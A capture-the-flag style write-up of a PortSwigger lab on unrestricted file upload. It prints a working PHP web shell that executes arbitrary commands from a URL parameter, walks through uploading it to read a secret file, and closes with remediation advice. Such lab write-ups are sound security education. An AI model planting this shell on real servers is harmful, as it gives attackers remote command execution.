## Metadata

- **Difficulty:** Apprentice 
- **Category:** File Upload Vulnerabilities
- **Lab URL:** [Lab: Remote code execution via web shell upload](https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload)
- **Date Solved:** 23/4/2026
## Vulnerability Summary

The app contains a vulnerable image upload function, as it does not perform any validation on the files users upload before storing them on the server's filesystem. These server-side uploaded scripts are also configured to be executed as code, allowing us to create our own web shell on the server, thus read arbitrary files from the server's filesystem.
## Reconnaissance

Navigate to `url/login` and login with credentials `wiener - peter` (given by the lab). After successfully logging, you'll taken to `url/my-account?id=wiener`, where you'll see an option to upload a file to be your avatar. Try uploading a simple `php` web shell with content below (credits: [Easy simple php webshell](https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985) yields a `200 OK` HTTP Response with a response message that reads: 
`The file avatars/shell.php has been uploaded.`. This confirms that there's no validation mechanism from the server to ensure that the user does not upload anything malicious.
```php
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
</pre>
</body>
</html>
```
## Exploitation Steps

1. Navigate to `url/login` and login with credentials `wiener - peter`. You'll taken to `url/my-account?id=wiener`, where you'll see an option to upload a file to be your avatar.
2. Upload the [PHP shell](shell.php). You'll be redirected to `url/my-account/avatar`, with the message `The file avatars/shell.php has been uploaded.`, and a link to return to your "My Account" page. Click on this link.
3. On the `url/my-account?id=wiener`, right click on your "avatar" and select "Open Image in New Tab". You'll be taken to `url/files/avatars/shell.php`, with a shell to execute commands. The `php` script has been executed as code, and we have successfully upload a web shell.
4. Execute a simple command `cat /home/carlos/secret` to read the content of the secret file. It will be displayed on the same page after you clicked "Execute". Submit the string as solution, and lab is solved.
## Payload Used

- `php` web shell: [PHP shell](shell.php)
- Command to read secret file: `cat /home/carlos/secret`.
In the `php` execution block:
```php
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
```
- `if(isset($_GET['cmd']))`: Checks if the `cmd` parameter exists in the URL query string, in order to prevent PHP from throwing "Undefined Index" warnings when the page is initially loaded without commands.
- `system(...)`: PHP function that executes a system command and directly outputs the results to the browser.
- `$_GET['cmd']`: retrieves the attacker's (our) input directly from the URL.
- `2>&1`: redirects stderr into stdout, to ensure that error messages are displayed in the browser.
## Root Cause

The app does not perform any input validation on the files users upload before storing them on the server's filesystem. These server-side uploaded scripts are also configured to be executed as code, allowing us to execute the `php` code in our file, thus successfully creating our web shell.
## Remediation

- Do not use blocklists (which can be bypassed using alternate extensions like `.php5`, `.phtml`, etc.). Implement a strict whitelist of accepted file extensions (e.g., `.jpg`, `.jpeg`, `.png`). Reject any file that does not strictly match the whitelist.
- Do not trust the `Content-Type` header from the client request, as it is easily spoofable. Verify the file's internal signature (magic bytes) using server-side libraries to ensure the file is genuinely the type it claims to be (e.g., checking that a JPEG starts with `FF D8 FF E0`).
- Configure the web server to prevent the execution of scripts in the directory where user files are stored. Use `.htaccess` or server configuration directives like `php_flag engine off` or `RemoveHandler .php` for `Apache`. For Nginx, ensure the location block for the upload directory does not pass requests to the FastCGI/PHP-FPM backend.
- Never use the user-supplied filename. Generate a new, randomized filename (e.g., using a UUID) upon upload to prevent path traversal attacks (`../`) and file overwriting.
- If possible, store uploaded files in a directory located outside of the web root. Serve them to users via a dedicated script that checks authorization and explicitly sets the `Content-Type` and `X-Content-Type-Options: nosniff` headers during download.